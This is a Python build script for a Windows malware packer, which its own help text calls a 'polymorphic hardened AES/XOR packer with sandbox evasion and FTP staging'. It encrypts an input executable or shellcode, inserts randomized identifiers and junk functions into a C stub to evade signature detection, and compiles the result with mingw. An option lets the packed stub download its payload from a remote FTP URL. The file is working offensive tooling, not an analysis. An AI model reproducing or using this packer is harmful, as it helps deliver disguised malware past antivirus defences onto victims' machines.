import argparse
import os
import subprocess
import random
import string
from urllib.parse import urlparse
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def xor_encrypt(data, key):
    key_bytes = key.encode()
    return bytes([b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(data)])

def aes_encrypt(data, key):
    key_bytes = key.encode()
    key_bytes = key_bytes.ljust(16, b'\0')[:16]  # Ensure 128-bit key
    cipher = AES.new(key_bytes, AES.MODE_CBC, iv=b'\0'*16)
    return cipher.encrypt(pad(data, 16))

def random_identifier(length=8):
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))

def generate_stub(payload_bytes, key, enc_algo, payload_type, url=None, embed_payload=True):
    if embed_payload:
        payload_array = ','.join(f'0x{b:02x}' for b in payload_bytes)
        payload_len = len(payload_bytes)
    else:
        payload_array = ''
        payload_len = 0

    with open("stub_template.c", "r") as f:
        stub_code = f.read()

    buf_name = random_identifier()
    size_name = random_identifier()
    capacity_name = random_identifier()
    junk_func = random_identifier()
    junk_var = random_identifier()

    stub_code = stub_code.replace("{{BUF_NAME}}", buf_name)
    stub_code = stub_code.replace("{{SIZE_NAME}}", size_name)
    stub_code = stub_code.replace("{{CAPACITY_NAME}}", capacity_name)

    junk_code = f"""
int {junk_func}() {{
    int {junk_var} = 0;
    for (int i = 0; i < 100; i++) {{
        {junk_var} += i;
    }}
    return {junk_var};
}}
"""
    stub_code = stub_code.replace("// {{JUNK}}", junk_code)

    stub_code = stub_code.replace("{{PAYLOAD_ARRAY}}", payload_array)
    stub_code = stub_code.replace("{{PAYLOAD_SIZE}}", str(payload_len))
    stub_code = stub_code.replace("{{KEY}}", f'"{key}"')
    stub_code = stub_code.replace("{{ENC_ALGO}}", f'"{enc_algo}"')
    stub_code = stub_code.replace("{{PAYLOAD_TYPE}}", f'"{payload_type}"')

    if url:
        parsed_url = urlparse(url)
        ip = parsed_url.hostname
        path = parsed_url.path.lstrip('/')
        port = parsed_url.port or 21
        stub_code = stub_code.replace("{{IP}}", ip)
        stub_code = stub_code.replace("{{PORT}}", str(port))
        stub_code = stub_code.replace("{{PATH}}", path)
    else:
        stub_code = stub_code.replace("{{IP}}", "")
        stub_code = stub_code.replace("{{PORT}}", "0")
        stub_code = stub_code.replace("{{PATH}}", "")

    os.makedirs("build", exist_ok=True)
    with open("build/stub.c", "w") as f:
        f.write(stub_code)

def compile_stub(output_name):
    cmd = [
        "x86_64-w64-mingw32-gcc",
        "-m64",
        "-Os",
        "build/stub.c",
        "-o", output_name,
        "-lwininet",
        "-lpsapi",
        "-lbcrypt"
    ]
    subprocess.run(cmd, check=True)

def main():
    parser = argparse.ArgumentParser(description="Polymorphic hardened AES/XOR packer with sandbox evasion and FTP staging")
    parser.add_argument("-i", "--input", required=True, help="Input file (exe or shellcode)")
    parser.add_argument("-o", "--output", required=True, help="Output packed executable")
    parser.add_argument("-t", "--type", required=True, choices=["shellcode", "exe"], help="Payload type")
    parser.add_argument("-e", "--encrypt", required=True, choices=["xor", "aes"], help="Encryption algorithm")
    parser.add_argument("-k", "--key", required=True, help="Encryption key")
    parser.add_argument("--url", help="Optional remote URL for staged payload (ftp:// preferred)")
    parser.add_argument("--bin", help="Output file for external payload (default payload.bin if --url used)")
    args = parser.parse_args()

    with open(args.input, "rb") as f:
        data = f.read()

    if args.encrypt == "xor":
        encrypted = xor_encrypt(data, args.key)
    else:
        encrypted = aes_encrypt(data, args.key)

    if args.url:
        bin_output = args.bin if args.bin else "payload.bin"
        with open(bin_output, "wb") as f:
            f.write(encrypted)
        print(f"[+] External encrypted payload written to {bin_output}")
        generate_stub(encrypted, args.key, args.encrypt, args.type, url=args.url, embed_payload=False)
    else:
        generate_stub(encrypted, args.key, args.encrypt, args.type, embed_payload=True)

    compile_stub(args.output)
    print(f"[+] Packed stub compiled to {args.output}")

if __name__ == "__main__":
    main()
